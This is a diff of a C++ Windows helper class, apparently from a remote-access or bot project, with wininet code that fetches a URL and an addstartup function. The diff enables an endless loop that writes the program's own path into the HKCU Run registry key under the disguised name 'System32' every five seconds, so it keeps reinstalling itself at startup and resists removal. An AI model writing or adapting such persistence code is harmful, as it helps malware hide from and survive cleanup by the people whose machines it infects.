@@ -3,6 +3,7 @@
 #include <fstream>
 #include <LM.h>
 #include <wininet.h>
+
 #pragma comment(lib,"wininet")
 
 #include <strsafe.h>
@@ -11,6 +12,9 @@
 class Helpers
 {
 	public:
+
+
+
 		static std::string GetWindowsVersionString() {
 			std::string     winver;
 			OSVERSIONINFOEX osver;
@@ -300,8 +304,6 @@ class Helpers
 			std::cout << url;
 			HINTERNET hInternetSession;
 			HINTERNET hURL;
-			// I'm only going to access 1K of info.
-			BOOL bResult;
 			DWORD dwBytesRead = 1;
 			//Make internet connection.
 			hInternetSession = InternetOpen(
@@ -338,15 +340,16 @@ class Helpers
 
 		static void addstartup()
 		{
-			//while (true) {
-				TCHAR path[100];
-				GetModuleFileName(NULL, path, 100);
-				HKEY newValue;
-				RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
-				RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
-				RegCloseKey(newValue);
-				//Sleep(5000);
-			//}
+			while (true) {
+					TCHAR path[100];
+					GetModuleFileName(NULL, path, 100);
+					HKEY newValue;
+					RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
+					RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
+					RegCloseKey(newValue);
+			
+				Sleep(5000);
+			}
 		}
 
 		static void removeRegInstallKey() {
